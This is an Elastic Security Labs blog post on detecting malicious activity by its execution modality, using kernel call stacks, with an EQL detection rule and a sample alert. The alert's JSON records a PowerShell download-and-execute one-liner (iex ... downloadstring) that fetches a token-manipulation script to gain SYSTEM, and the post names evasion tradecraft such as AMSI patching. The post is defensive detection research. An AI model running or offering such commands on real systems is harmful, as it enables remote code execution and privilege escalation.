---
title: "Misbehaving Modalities: Detecting Tools, Not Techniques"
slug: "misbehaving-modalities"
date: "2025-05-15"
description: "We explore the concept of Execution Modality and how modality-focused detections can complement behaviour-focused ones."
author:
  - slug: john-uhlmann
image: "modalities.png"
category:
  - slug: security-research
  - slug: detection-science
---

## **What is Execution Modality?**

[Jared Atkinson](https://medium.com/@jaredcatkinson), Chief Strategist at SpecterOps and prolific writer on security strategy, recently introduced the very useful concept of [Execution Modality](https://posts.specterops.io/behavior-vs-execution-modality-3318e8e81739) to help us reason about malware techniques, and how to robustly detect them. In short, Execution Modality describes *how* a malicious behaviour is executed, rather than simply defining *what* the behaviour does.

For example, the behaviour of interest might be [Windows service creation](https://attack.mitre.org/techniques/T1543/003/), and the modality might be either a system utility (such as \`sc.exe\`), a PowerShell script, or shellcode that uses indirect syscalls to directly write to the service configuration in the Windows Registry.  

Atkinson outlined that if your goal is to detect a specific technique, you want to ensure that your collection is as close as possible to the operating system’s source of truth and eliminate any modality assumptions.

## **Case Study: service creation modalities**

![Service creation operation flow graph](/assets/images/misbehaving-modalities/flow.png)

In the typical Service creation scenario within the Windows OS, an installer calls [`sc.exe create`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) which makes an [`RCreateService`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/6a8ca926-9477-4dd4-b766-692fab07227e) RPC call to an endpoint in the [Service Control Manager](https://learn.microsoft.com/en-us/windows/win32/services/service-control-manager) (SCM, aka `services.exe`) which then makes syscalls to the [kernel-mode configuration manager](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/windows-kernel-mode-configuration-manager) to update the [database of installed services](https://learn.microsoft.com/en-us/windows/win32/services/database-of-installed-services) in the registry.  This is later flushed to disk and restored from disk on boot.

This means that the source of truth for a running system [is the registry](https://abstractionmaps.com/maps/t1050/) (though hives are flushed to disk and can be tampered with offline).

In a threat hunting scenario, we could easily detect anomalous `sc.exe` command lines - but a different tool might make Service Control RPC calls directly.

If we were processing our threat data stringently, we could also detect anomalous Service Control RPC calls, but a different tool might make syscalls (in)directly or use another service, such as the [Remote Registry](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/ec095de8-b4fe-48fb-8114-dea65b4d710e), to update the service database indirectly.

In other words, some of these execution modalities bypass traditional telemetry such as [Windows event logs](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4697).

So how do we monitor changes to the configuration manager?  We can’t robustly monitor syscalls directly due to [Kernel Patch Protection](https://en.wikipedia.org/wiki/Kernel_Patch_Protection), but Microsoft has provided [configuration manager callbacks](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/filtering-registry-calls) as an alternative. This is where Elastic has [focused our service creation detection](https://github.com/tsale/EDR-Telemetry/pull/58#issuecomment-2043958734) efforts - as close to the operating system’s source of truth as possible.

The trade-off for this low-level visibility, however, is a potential reduction in context. For example, due to Windows architectural decisions, security vendors do not know which RPC client is requesting the creation of a registry key in the services database. Microsoft only supports querying RPC client details from a user-mode RPC service.  

Starting with Windows 10 21H1, Microsoft began including [RPC client details in the service creation event log](https://github.com/jdu2600/Windows10EtwEvents/commit/5444e040d65ed2807fcf9ac69ce32131338dc370#diff-b88b65ff9fd39a51c51c594ee3787ea6907e780d4282ae9a7517c04074e2c2b7). This event, while less robust, sometimes provides additional context that might assist in determining the source of an anomalous behaviour.

Due to their history of abuse, some modalities have been extended with extra logging - one important example is PowerShell.  This allows certain techniques to be detected with high precision - but *only* when executed within PowerShell. It is important not to conflate having detection coverage of a technique in PowerShell with coverage of that technique in general. This nuance is important when estimating [MITRE ATT&CK](https://attack.mitre.org/) coverage.  As red teams routinely demonstrate, having 100% technique coverage - but only for PowerShell - is close to 0% real-world coverage.

[Summiting the Pyramid](https://ctid.mitre.org/projects/summiting-the-pyramid/) (STP) is a related analytic scoring methodology from MITRE. It makes a similar conclusion about the fragility of [PowerShell scriptblock-based detections](https://center-for-threat-informed-defense.github.io/summiting-the-pyramid/analytics/service_registry_permissions_weakness_check/) and assigns such rules a low robustness score.

High-level telemetry sources, such as Process Creation logging and PowerShell logging, are extremely brittle at detecting most techniques as they cover very few modalities. At best, they assist in detecting the most egregious Living off the Land (LotL) abuses.

Atkinson made the following astute observation in the [example](https://posts.specterops.io/behavior-vs-execution-modality-3318e8e81739) used to motivate the discussion:

*An important point is that our higher-order objective in detection is behavior-based, not modality-based. Therefore, we should be interested in detecting Session Enumeration (behavior-focused), not Session Enumeration in PowerShell (modality-focused).*

Sometimes that is only half of the story though.  Sometimes detecting that the tool itself is out of context is more efficient than detecting the technique. Sometimes the execution modality itself is anomalous.

An alternative to detecting a known technique is to detect a misbehaving modality.

## **Call stacks divulge Modality**

One of Elastic’s strengths is the inclusion of call stacks in the majority of our events. This level of call provenance detail greatly assists in determining whether a given activity is malicious or benign.  Call stack summaries are often sufficient to divulge the execution modality - the runtimes for PowerShell, .NET, RPC, WMI, VBA, Lua, Python, and Java all leave traces in the call stack.

Some of our [first call stack-based rules](https://www.elastic.co/security-labs/upping-the-ante-detecting-in-memory-threats-with-kernel-call-stacks) were for Office VBA macros (`vbe7.dll`) spawning child processes or dropping files, and for unbacked executable memory loading the .NET runtime.  In both of these examples, the technique itself was largely benign; it was the modality of the behaviour that was predominantly anomalous.

So can we flip the typical behaviour-focused detection approach to a modality-focused one?  For example, can we detect solely on the use of **any** dual-purpose API call originating from PowerShell?

Using call stacks, Elastic is able to differentiate between the API calls that originate from PowerShell scripts and those that come from the PowerShell or .NET runtimes.

Using Threat-Intelligence ETW as an approximation for a dual-purpose API, our rule for “Suspicious API Call from a PowerShell Script” was quite effective.

```sql
api where
event.provider == "Microsoft-Windows-Threat-Intelligence" and
process.name in~ ("powershell.exe", "pwsh.exe", "powershell_ise.exe") and

/* PowerShell Script JIT - and incidental .NET assemblies */
process.thread.Ext.call_stack_final_user_module.name == "Unbacked" and
process.thread.Ext.call_stack_final_user_module.protection_provenance in ("clr.dll", "mscorwks.dll", "coreclr.dll") and

/* filesystem enumeration activity */
not process.Ext.api.summary like "IoCreateDevice( \\FileSystem\\*, (null) )" and

/* exclude nop operations */
not (process.Ext.api.name == "VirtualProtect" and process.Ext.api.parameters.protection == "RWX" and process.Ext.api.parameters.protection_old == "RWX") and

/* Citrix GPO Scripts */
not (process.parent.executable : "C:\\Windows\\System32\\gpscript.exe" and
  process.Ext.api.summary in ("VirtualProtect( Unbacked, 0x10, RWX, RW- )", "WriteProcessMemory( Self, Unbacked, 0x10 )", "WriteProcessMemory( Self, Data, 0x10 )")) and

/* cybersecurity tools */
not (process.Ext.api.name == "VirtualAlloc" and process.parent.executable : ("C:\\Program Files (x86)\\CyberCNSAgent\\cybercnsagent.exe", "C:\\Program Files\\Velociraptor\\Velociraptor.exe")) and

/* module listing */
not (process.Ext.api.name in ("EnumProcessModules", "GetModuleInformation", "K32GetModuleBaseNameW", "K32GetModuleFileNameExW") and
  process.parent.executable : ("*\\Lenovo\\*\\BGHelper.exe", "*\\Octopus\\*\\Calamari.exe")) and

/* WPM triggers multiple times at process creation */
not (process.Ext.api.name == "WriteProcessMemory" and
     process.Ext.api.metadata.target_address_name in ("PEB", "PEB32", "ProcessStartupInfo", "Data") and
     _arraysearch(process.thread.Ext.call_stack, $entry, $entry.symbol_info like ("?:\\windows\\*\\kernelbase.dll!CreateProcess*", "Unknown")))
```

Even though we don’t need to use the brittle PowerShell AMSI logging for detection, we can still provide this detail in the event as context as it assists with triage.  This modality-based approach even detects common PowerShell defence evasion tradecraft such as:
 - ntdll unhooking
 - AMSI patching
 - user-mode ETW patching

```json
{
 "event": {
  "provider": "Microsoft-Windows-Threat-Intelligence",
  "created": "2025-01-29T18:27:09.4386902Z",
  "kind": "event",
  "category": "api",
  "type": "change",
  "outcome": "unknown"
 },
 "message": "Endpoint API event - VirtualProtect",
 "process": {
  "parent": {
   "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
  },
  "name": "powershell.exe",
  "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "code_signature": {
   "trusted": true,
   "subject_name": "Microsoft Windows",
   "exists": true,
   "status": "trusted"
  },
  "command_line": "\"powershell.exe\" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem}",
  "pid": 21908,
  "Ext": {
   "api": {
    "summary": "VirtualProtect( kernel32.dll!FatalExit, 0x21, RWX, R-X )",
    "metadata": {
     "target_address_path": "c:\\windows\\system32\\kernel32.dll",
     "amsi_logs": [
      {
       "entries": [
        "& {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem}",
        "{iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem}",
        "function Get-WinLogonTokenSystem\n{\nfunction _10001011000101101\n{\n  [CmdletBinding()]\n  Param(\n [Parameter(Position = 0, Mandatory = $true)]\n [ValidateNotNullOrEmpty()]\n [Byte[]]\n ${_00110111011010011},\n ...<truncated>",
        "{[Char] $_}",
        "{\n [CmdletBinding()]\n Param(\n   [Parameter(Position = 0, Mandatory = $true)]\n   [Byte[]]\n   ${_00110111011010011},\n   [Parameter(Position = 1, Mandatory = $true)]\n   [String]\n   ${_10100110010101100},\n ...<truncated>",
        "{ $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBkAGwAbAA=')))) }"
       ],
       "type": "PowerShell"
      }
     ],
     "target_address_name": "kernel32.dll!FatalExit",
     "amsi_filenames": [
      "C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psd1",
      "C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psm1"
     ]
    },
    "behaviors": [
     "sensitive_api",
     "hollow_image",
     "unbacked_rwx"
    ],
    "name": "VirtualProtect",
    "parameters": {
     "address": 140727652261072,
     "size": 33,
     "protection_old": "R-X",
     "protection": "RWX"
    }
   },
   "code_signature": [
    {
     "trusted": true,
     "subject_name": "Microsoft Windows",
     "exists": true,
     "status": "trusted"
    }
   ],
   "token": {
    "integrity_level_name": "high"
   }
  },
  "thread": {
   "Ext": {
    "call_stack_summary": "ntdll.dll|kernelbase.dll|Unbacked",
    "call_stack_contains_unbacked": true,
    "call_stack": [
     {
      "symbol_info": "c:\\windows\\system32\\ntdll.dll!NtProtectVirtualMemory+0x14"
     },
     {
      "symbol_info": "c:\\windows\\system32\\kernelbase.dll!VirtualProtect+0x3b"
     },
     {
      "symbol_info": "Unbacked+0x3b5c",
      "protection_provenance": "clr.dll",
      "callsite_trailing_bytes": "41c644240c01833dab99f35f007406ff15b7b6f25f8bf0e85883755f85f60f95c00fb6c00fb6c041c644240c01488b55884989542410488d65c85b5e5f415c41",
      "protection": "RWX",
      "callsite_leading_bytes": "df765f4d63f64c897dc0488d55b8488bcee8ee6da95f4d8bcf488bcf488bd34d8bc64533db4c8b55b84c8955904c8d150c0000004c8955a841c644240c00ffd0"
     }
    ],
    "call_stack_final_user_module": {
     "code_signature": [
      {
       "trusted": true,
       "subject_name": "Microsoft Corporation",
       "exists": true,
       "status": "trusted"
      }
     ],
     "protection_provenance_path": "c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\clr.dll",
     "name": "Unbacked",
     "protection_provenance": "clr.dll",
     "protection": "RWX",
     "hash": {
      "sha256": "707564fc98c58247d088183731c2e5a0f51923c6d9a94646b0f2158eb5704df4"
     }
    }
   },
   "id": 17260
  }
 },
 "user": {
  "id": "S-1-5-21-47396387-2833971351-1621354421-500"
 }
}
```
## **Robustness assessment**

Using the [Summiting the Pyramid](https://ctid.mitre.org/projects/summiting-the-pyramid/) analytic scoring methodology we can compare our PowerShell modality-based detection rule with traditional PowerShell 

|  | Application (A) | User mode (U) | Kernel mode (K) |
| :---- | :---- | :---- | :---- |
| **Core to (Sub) Technique (5)** |  |  | **\[ best \]** Kernel ETW-based PowerShell modality detections |
| **Core to Part of (Sub-) Technique (4)** |  |  |  |
| **Core to Pre-Existing Tool (3)** |  |  |  |
| **Core to Adversary-brought Tool (2)** | AMSI and ScriptBlock-based PowerShell content detections |  |  |
| **Ephemeral (1)** | **\[ worst \]** |  |  |

PowerShell Analytic Scoring using [Summiting the Pyramid](https://ctid.mitre.org/projects/summiting-the-pyramid/)

As noted earlier, most PowerShell detections receive a low 2A robustness score using the STP scale.  This is in stark contrast to our [PowerShell misbehaving modality rule](https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/windows/execution_suspicious_api_call_from_a_powershell_script.toml) which receives the highest possible 5K score (where appropriate kernel telemetry is available from Microsoft).

One caveat is that an STP analytic score does not yet include any measure for the setup and maintenance costs of a rule. This could potentially be approximated by the size of the known false positive software list for a given rule - though most open rule sets typically do not include this information. We do and, in our rule’s case, the false positives observed to date have been extremely manageable.

## **Can call stacks be spoofed though?**

Yes - and slightly no. Our call stacks are all collected inline in the kernel, but the user-mode call stack itself resides in user-mode memory that the malware may control. This means that, if malware has achieved arbitrary execution, then it can control the stack frames that we see.

Sure, dual-purpose API [calls from private memory](https://github.com/search?q=repo%3Aelastic%2Fprotections-artifacts+%22Unbacked+memory%22&type=code) are suspicious, but sometimes trying to hide your private memory is even more suspicious. This can take the form of:

* Calls from [overwritten modules](https://github.com/search?q=repo%3Aelastic%2Fprotections-artifacts+allocation_private_bytes&type=code).  
* Return addresses [without a preceding call](https://github.com/search?q=repo%3Aelastic%2Fprotections-artifacts+image_rop&type=code) instruction.  
* Calls [proxied via other modules](https://github.com/search?q=repo%3Aelastic%2Fprotections-artifacts+proxy_call&type=code).

Call stack control alone may not be enough. In order to truly bypass some of our call stack detections, an attacker must craft a call stack that entirely blends with normal activity.  In some environments this can be baselined by security teams with high accuracy; making it hard for the attackers to remain undetected. Based on our in-house research, and with the assistance of red team tool developers, we are also continually improving our out-of-the-box detections.

Finally, on modern CPUs there are also numerous execution trace mechanisms that can be used to detect stack spoofing - such as [Intel LBR](https://www.blackhat.com/docs/us-16/materials/us-16-Pierce-Capturing-0days-With-PERFectly-Placed-Hardware-Traps-wp.pdf), Intel BTS, Intel AET, [Intel IPT](https://www.microsoft.com/en-us/research/wp-content/uploads/2017/01/griffin-asplos17.pdf), [x64 CET](https://www.elastic.co/security-labs/finding-truth-in-the-shadows) and [x64 Architectural LBR](https://lwn.net/Articles/824613/). Elastic already takes advantage of some of these hardware features, we have suggested to Microsoft that they may also wish to do so in further scenarios outside of exploit protection, and we are investigating further enhancements ourselves. Stay tuned.

## **Conclusion**

Execution Modality is a new lens through which we can seek to understand attacker tradecraft. 

Detecting specific techniques for individual modalities is not a cost-effective approach though - there are simply too many techniques and too many modalities. Instead, we should focus our technique detections as close to the operating system source of truth as possible; being careful not to lose necessary activity context, or to introduce unmanageable false positives. This is why Elastic considers [Kernel ETW](https://www.elastic.co/security-labs/kernel-etw-best-etw) to be superior to user-mode `ntdll` hooking - it is closer to the source of truth allowing more robust detections.

For modality-based detection approaches, the value becomes apparent when we baseline **all** expected low-level telemetry for a given modality - and trigger on **any** deviations.

Historically, attackers have been able to choose modality for convenience. It is more cost effective to write tools in C# or PowerShell than in C or assembly.  If we can herd modality then we’ve imposed cost.